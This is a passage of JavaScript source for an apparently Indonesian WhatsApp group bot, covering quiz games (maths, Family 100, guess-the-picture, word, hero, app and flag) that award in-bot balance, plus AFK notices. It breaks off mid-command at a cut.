if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && !isCmd) {
 kuis = true
 jawaban = kuismath[m.sender.split('@')[0]][0]
 hadiah = kuismath[m.sender.split('@')[0]][1]
 if (budy.toLowerCase() == jawaban) {
m.reply(` 🎮 Kuis Matematika🎮\n\nJawaban Benar 🎉\n\n+Rp ${hadiah} Balance` + `\n\nKirim perintah .math untuk bermain lagi 🎮`)
await addBalance(m.sender, hadiah, balance)
delete kuismath[m.sender.split('@')[0]]
 } 
}
if (('family100' + m.chat in _family100) && !isCmd) {
 kuis = true
let room = _family100['family100' + m.chat]
let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
 if (!isSurender) {
let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
if (room.terjawab[index]) return !0
room.terjawab[index] = m.sender
 }
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
}).filter(v => v).join('\n')}
${isSurender ? '' : ``}`.trim()
 juna.sendTextWithMentions(m.chat, caption, m)
.then(mes => {
return _family100['family100' + m.chat].pesan = mesg
}).catch(_ => _)
 if (isWin || isSurender) delete _family100['family100' + m.chat]
}
if (tebakgame[m.chat] && !isCmd) {
let json = JSON.parse(JSON.stringify(tebakgame[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, tebakgame[m.chat][2], balance) 
await bales(JwbTrue("Tebak Game", tebakgame[m.chat][2]) + `\n\nKirim perintah .tebakgame untuk bermain lagi 🎮`)
await juna.sendMessage(m.chat, { delete: tebakgame[m.chat][0].key })
clearTimeout(tebakgame[m.chat][3])
delete tebakgame[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
m.reply(`_Ya, Dikit Lagi!_`)
}

if (tebakhero[m.chat] && !isCmd) {
let json = JSON.parse(JSON.stringify(tebakhero[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, tebakhero[m.chat][2], balance) 
await bales(JwbTrue("Tebak Hero", tebakhero[m.chat][2]) + `\n\nKirim perintah .tebakhero untuk bermain lagi 🎮`)
await juna.sendMessage(m.chat, { delete: tebakhero[m.chat][0].key })
clearTimeout(tebakhero[m.chat][3])
delete tebakhero[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
m.reply(`_Ya, Dikit Lagi!_`)
}

if (tebakaplikasi[m.chat] && !isCmd) {
let json = JSON.parse(JSON.stringify(tebakaplikasi[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, tebakaplikasi[m.chat][2], balance) 
await bales(JwbTrue("Tebak Aplikasi", tebakaplikasi[m.chat][2]) + `\n\nKirim perintah .tebakaplikasi untuk bermain lagi 🎮`)
await juna.sendMessage(m.chat, { delete: tebakaplikasi[m.chat][0].key })
clearTimeout(tebakaplikasi[m.chat][3])
delete tebakaplikasi[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
m.reply(`_Ya, Dikit Lagi!_`)
}

if (tebakgambar[m.chat] && !isCmd) {
let json = JSON.parse(JSON.stringify(tebakgambar[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, tebakgambar[m.chat][2], balance)
await bales(JwbTrue("Tebak Gambar", tebakgambar[m.chat][2]) + `\n\nKirim perintah .tebakgambar untuk bermain lagi 🎮`)
await juna.sendMessage(m.chat, { delete: tebakgambar[m.chat][0].key })
clearTimeout(tebakgambar[m.chat][3])
delete tebakgambar[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
m.reply(`_Ya, Dikit Lagi!_`)

}
if (tebakkata[m.chat] && !isCmd) {
let json = JSON.parse(JSON.stringify(tebakkata[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, tebakkata[m.chat][2], balance)
await bales(JwbTrue("Tebak Kata", tebakkata[m.chat][2]) + `\n\nKirim perintah .tebakkata untuk bermain lagi 🎮`)
clearTimeout(tebakkata[m.chat][3])
delete tebakkata[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
m.reply(`_Ya, Dikit Lagi!_`)
}

if (asahotak[m.chat] && !isCmd) {
let json = JSON.parse(JSON.stringify(asahotak[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, asahotak[m.chat][2], balance)
await bales(JwbTrue("Asah Otak", asahotak[m.chat][2]) + `\n\nKirim perintah .asahotak untuk bermain lagi 🎮`)
clearTimeout(asahotak[m.chat][3])
delete asahotak[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
m.reply(`_Ya, Dikit Lagi!_`)
}

if (lengkapikalimat[m.chat] && !isCmd) {
let json = JSON.parse(JSON.stringify(lengkapikalimat[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, lengkapikalimat[m.chat][2], balance)
await bales(JwbTrue("Lengkapi Kalimat", lengkapikalimat[m.chat][2]) + `\n\nKirim perintah .lengkapikalimat untuk bermain lagi 🎮`)
clearTimeout(lengkapikalimat[m.chat][3])
delete lengkapikalimat[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
m.reply(`_Ya, Dikit Lagi!_`)
}

if (tebakbendera[m.chat] && !isCmd) {
let json = JSON.parse(JSON.stringify(tebakbendera[m.chat][1]))
jawaban = json.name.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, tebakbendera[m.chat][2], balance) 
await bales(JwbTrue("Tebak Bendera", tebakbendera[m.chat][2]) + `\n\nKirim perintah .tebakbendera untuk bermain lagi 🎮`)
await juna.sendMessage(m.chat, { delete: tebakbendera[m.chat][0].key })
clearTimeout(tebakbendera[m.chat][3])
delete tebakbendera[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
m.reply(`_Ya, Dikit Lagi!_`)

}
if (caklontong[m.chat] && !isCmd) {
let json = JSON.parse(JSON.stringify(caklontong[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, caklontong[m.chat][2], balance)
await bales(JwbTrue("Cak Lontong", caklontong[m.chat][2]) + `\n\nKirim perintah .caklontong untuk bermain lagi 🎮`)
clearTimeout(caklontong[m.chat][3])
delete caklontong[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
m.reply(`_Ya, Dikit Lagi!_`)

}
if (susunkata[m.chat] && !isCmd) {
let json = JSON.parse(JSON.stringify(susunkata[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, susunkata[m.chat][2], balance) 
await bales(JwbTrue("Susun Kata", susunkata[m.chat][2]) + `\n\nKirim perintah .susunkata untuk bermain lagi 🎮`)
clearTimeout(susunkata[m.chat][3])
delete susunkata[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
m.reply(`_Ya, Dikit Lagi!_`)

}
if (tebakkalimat[m.chat] && !isCmd) {
let json = JSON.parse(JSON.stringify(tebakkalimat[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, tebakkalimat[m.chat][2], balance) 
await bales(JwbTrue("Tebak Kalimat", tebakkalimat[m.chat][2]) + `\n\nKirim perintah .tebakkalimat untuk bermain lagi 🎮`)
clearTimeout(tebakkalimat[m.chat][3])
delete tebakkalimat[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
m.reply(`_Ya, Dikit Lagi!_`)

}
if (siapaaku[m.chat] && !isCmd) {
let json = JSON.parse(JSON.stringify(siapaaku[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, siapaaku[m.chat][2], balance)
await bales(JwbTrue("Tebak Siapa", siapaaku[m.chat][2]) + `\n\nKirim perintah .tebaksiapa untuk bermain lagi 🎮`)
clearTimeout(siapaaku[m.chat][3])
delete siapaaku[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
m.reply(`_Ya, Dikit Lagi!_`)

}
if (tekateki[m.chat] && !isCmd) {
let json = JSON.parse(JSON.stringify(tekateki[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, tekateki[m.chat][2], balance) 
await bales(JwbTrue("Teka Teki", tekateki[m.chat][2]) + `\n\nKirim perintah .tekateki untuk bermain lagi 🎮`)
clearTimeout(tekateki[m.chat][3])
delete tekateki[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
m.reply(`_Ya, Dikit Lagi!_`)

}
if (tebakkimia[m.chat] && !isCmd) {
let json = JSON.parse(JSON.stringify(tebakkimia[m.chat][1]))
jawaban = json.unsur.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, tebakkimia[m.chat][2], balance)
await bales(JwbTrue("Teka Kimia", tebakkimia[m.chat][2]) + `\n\nKirim perintah .tebakkimia untuk bermain lagi 🎮`)
clearTimeout(tebakkimia[m.chat][3])
delete tebakkimia[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
m.reply(`_Ya, Dikit Lagi!_`)

}
if (tebaklirik[m.chat] && !isCmd) {
let json = JSON.parse(JSON.stringify(tebaklirik[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, tebaklirik[m.chat][2], balance) 
await bales(JwbTrue("Teka Lirik", tebaklirik[m.chat][2]) + `\n\nKirim perintah .tebaklirik untuk bermain lagi 🎮`)
clearTimeout(tebaklirik[m.chat][3])
delete tebaklirik[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
m.reply(`_Ya, Dikit Lagi!_`)

}
if (tebaktebakan[m.chat] && !isCmd) {
let json = JSON.parse(JSON.stringify(tebaktebakan[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, tebaktebakan[m.chat][2], balance) 
await bales(JwbTrue("Teka Tebakan", tebaktebakan[m.chat][2]) + `\n\nKirim perintah .tebaktebakan untuk bermain lagi 🎮`)
clearTimeout(tebaktebakan[m.chat][3])
delete tebaktebakan[m.chat]
} else if (similarity(m.text.toLowerCase(), jawaban) >= threshold)
m.reply(`_Ya, Dikit Lagi!_`)

}


 if (m.isGroup && !m.key.fromMe) {
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let ment of mentionUser) {
if (afk.checkAfkUser(ment, _afk)) {
let getId2 = afk.getAfkId(ment, _afk)
let getReason2 = afk.getAfkReason(getId2, _afk)
let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
let heheh2 = ms(getTimee)
m.reply(`Jangan tag, dia sedang afk\n\n*Reason :* ${getReason2}\n*Sejak :* ${heheh2.hours} jam, ${heheh2.minutes} menit, ${heheh2.seconds} detik yg lalu\n`)
}
}
if (afk.checkAfkUser(m.sender, _afk)) {
let getId = afk.getAfkId(m.sender, _afk)
let getReason = afk.getAfkReason(getId, _afk)
let getTime = Date.now() - afk.getAfkTime(getId, _afk)
let heheh = ms(getTime)
_afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
fs.writeFileSync('./database/afk.json', JSON.stringify(_afk))
juna.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} telah kembali dari afk\n\n*Reason :* ${getReason}\n*Selama :* ${heheh.hours} jam ${heheh.minutes} menit ${heheh.seconds} detik\n`, m)
}
}


switch(command) {
case "tebakgambar": {
if (tekateki[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tekateki[m.chat][0]
})
if (caklontong[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: caklontong[m.chat][0]
})
if (susunkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: susunkata[m.chat][0]
})
if (tebaktebakan[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaktebakan[m.chat][0]
})
if (tebaklirik[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaklirik[m.chat][0]
})
if (tebakkimia[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkimia[m.chat][0]
})
if (siapaaku[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: siapaaku[m.chat][0]
})
if (tebakkalimat[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkalimat[m.chat][0]
})
if (tebakbendera[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakbendera[m.chat][0]
})
if (tebakkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkata[m.chat][0]
})
if (asahotak[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: asahotak[m.chat][0]
})
if (lengkapikalimat[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: lengkapikalimat[m.chat][0]
})
if (tebakgame[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgame[m.chat][0]
})
if (tebakhero[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakhero[m.chat][0]
})
if (tebakaplikasi[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakaplikasi[m.chat][0]
})
if (tebakgambar[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgambar[m.chat][0]
})
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (isGame(m.sender, isPremium, isCreator, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (!isCreator && !isPremium) { gameAdd(m.sender, glimit) }
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tebakgambar[m.chat] = [
await juna.sendMessage(m.chat, { image: { url: result.img }, caption: `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._` }, { quoted: m }), result, 250,
setTimeout(() => {
if (tebakgambar[m.chat]) {
m.reply(waktuHabis(result.jawaban))
juna.sendMessage(m.chat, { delete: tebakgambar[m.chat][0].key })
delete tebakgambar[m.chat]
}
}, 120000)
]
}
break
case "tebakgame": {
if (tekateki[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tekateki[m.chat][0]
})
if (caklontong[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: caklontong[m.chat][0]
})
if (susunkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: susunkata[m.chat][0]
})
if (tebaktebakan[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaktebakan[m.chat][0]
})
if (tebaklirik[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaklirik[m.chat][0]
})
if (tebakkimia[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkimia[m.chat][0]
})
if (siapaaku[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: siapaaku[m.chat][0]
})
if (tebakkalimat[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkalimat[m.chat][0]
})
if (tebakbendera[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakbendera[m.chat][0]
})
if (tebakkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkata[m.chat][0]
})
if (asahotak[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: asahotak[m.chat][0]
})
if (lengkapikalimat[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: lengkapikalimat[m.chat][0]
})
if (tebakgambar[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgambar[m.chat][0]
})
if (tebakgame[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgame[m.chat][0]
})
if (tebakhero[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakhero[m.chat][0]
})
if (tebakaplikasi[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakaplikasi[m.chat][0]
})
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (isGame(m.sender, isPremium, isCreator, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (!isCreator && !isPremium) { gameAdd(m.sender, glimit) }
let anu = await fetchJson('https://raw.githubusercontent.com/qisyana/scrape/main/tebakgame.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tebakgame[m.chat] = [
await juna.sendMessage(m.chat, { image: { url: result.img }, caption: `Gambar diatas adalah game?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._` }, { quoted: m }), result, 250,
setTimeout(() => {
if (tebakgame[m.chat]) {
m.reply(waktuHabis(result.jawaban))
juna.sendMessage(m.chat, { delete: tebakgame[m.chat][0].key })
delete tebakgame[m.chat]
}
}, 120000)
]
}
break
case "tebakhero": {
if (tekateki[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tekateki[m.chat][0]
})
if (caklontong[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: caklontong[m.chat][0]
})
if (susunkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: susunkata[m.chat][0]
})
if (tebaktebakan[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaktebakan[m.chat][0]
})
if (tebaklirik[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaklirik[m.chat][0]
})
if (tebakkimia[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkimia[m.chat][0]
})
if (siapaaku[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: siapaaku[m.chat][0]
})
if (tebakkalimat[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkalimat[m.chat][0]
})
if (tebakbendera[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakbendera[m.chat][0]
})
if (tebakkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkata[m.chat][0]
})
if (asahotak[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: asahotak[m.chat][0]
})
if (lengkapikalimat[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: lengkapikalimat[m.chat][0]
})
if (tebakgambar[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgambar[m.chat][0]
})
if (tebakgame[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgame[m.chat][0]
})
if (tebakhero[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakhero[m.chat][0]
})
if (tebakaplikasi[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakaplikasi[m.chat][0]
})
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (isGame(m.sender, isPremium, isCreator, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (!isCreator && !isPremium) { gameAdd(m.sender, glimit) }
let anu = await fetchJson('https://raw.githubusercontent.com/Yahyaalmuthahar/database/main/tebakhero.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tebakhero[m.chat] = [
await juna.sendMessage(m.chat, { image: { url: result.img }, caption: `Gambar diatas adalah hero?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._` }, { quoted: m }), result, 250,
setTimeout(() => {
if (tebakhero[m.chat]) {
m.reply(waktuHabis(result.jawaban))
juna.sendMessage(m.chat, { delete: tebakhero[m.chat][0].key })
delete tebakhero[m.chat]
}
}, 120000)
]
}
break
case "tebakaplikasi": {
if (tekateki[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tekateki[m.chat][0]
})
if (caklontong[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: caklontong[m.chat][0]
})
if (susunkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: susunkata[m.chat][0]
})
if (tebaktebakan[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaktebakan[m.chat][0]
})
if (tebaklirik[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaklirik[m.chat][0]
})
if (tebakkimia[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkimia[m.chat][0]
})
if (siapaaku[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: siapaaku[m.chat][0]
})
if (tebakkalimat[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkalimat[m.chat][0]
})
if (tebakbendera[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakbendera[m.chat][0]
})
if (tebakkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkata[m.chat][0]
})
if (asahotak[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: asahotak[m.chat][0]
})
if (lengkapikalimat[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: lengkapikalimat[m.chat][0]
})
if (tebakgambar[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgambar[m.chat][0]
})
if (tebakgame[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgame[m.chat][0]
})
if (tebakhero[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakhero[m.chat][0]
})
if (tebakaplikasi[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakaplikasi[m.chat][0]
})
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (isGame(m.sender, isPremium, isCreator, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (!isCreator && !isPremium) { gameAdd(m.sender, glimit) }
let anu = await fetchJson('https://raw.githubusercontent.com/Yahyaalmuthahar/database/main/tebakaplikasi.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tebakaplikasi[m.chat] = [
await juna.sendMessage(m.chat, { image: { url: result.image }, caption: `Gambar diatas adalah aplikasi?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._` }, { quoted: m }), result, 250,
setTimeout(() => {
if (tebakaplikasi[m.chat]) {
m.reply(waktuHabis(result.jawaban))
juna.sendMessage(m.chat, { delete: tebakaplikasi[m.chat][0].key })
delete tebakaplikasi[m.chat]
}
}, 120000)
]
}
break
case "tebakkata": {
if (tekateki[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tekateki[m.chat][0]
})
if (caklontong[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: caklontong[m.chat][0]
})
if (susunkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: susunkata[m.chat][0]
})
if (tebaktebakan[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaktebakan[m.chat][0]
})
if (tebaklirik[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaklirik[m.chat][0]
})
if (tebakkimia[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkimia[m.chat][0]
})
if (siapaaku[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: siapaaku[m.chat][0]
})
if (tebakkalimat[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkalimat[m.chat][0]
})
if (tebakbendera[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakbendera[m.chat][0]
})
if (tebakgame[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgame[m.chat][0]
})
if (tebakhero[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakhero[m.chat][0]
})
if (tebakaplikasi[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakaplikasi[m.chat][0]
})
if (tebakgambar[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgambar[m.chat][0]
})
if (tebakkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkata[m.chat][0]
})
if (asahotak[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: asahotak[m.chat][0]
})
if (lengkapikalimat[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: lengkapikalimat[m.chat][0]
})
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (isGame(m.sender, isPremium, isCreator, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (!isCreator && !isPremium) { gameAdd(m.sender, glimit) }
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tebakkata[m.chat] = [
await juna.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
setTimeout(() => {
if (tebakkata[m.chat]) {
m.reply(waktuHabis(result.jawaban))
delete tebakkata[m.chat]
}
}, 120000)
]
}
break
case "asahotak": {
if (tekateki[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tekateki[m.chat][0]
})
if (caklontong[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: caklontong[m.chat][0]
})
if (susunkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: susunkata[m.chat][0]
})
if (tebaktebakan[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaktebakan[m.chat][0]
})
if (tebaklirik[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaklirik[m.chat][0]
})
if (tebakkimia[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkimia[m.chat][0]
})
if (siapaaku[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: siapaaku[m.chat][0]
})
if (tebakkalimat[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
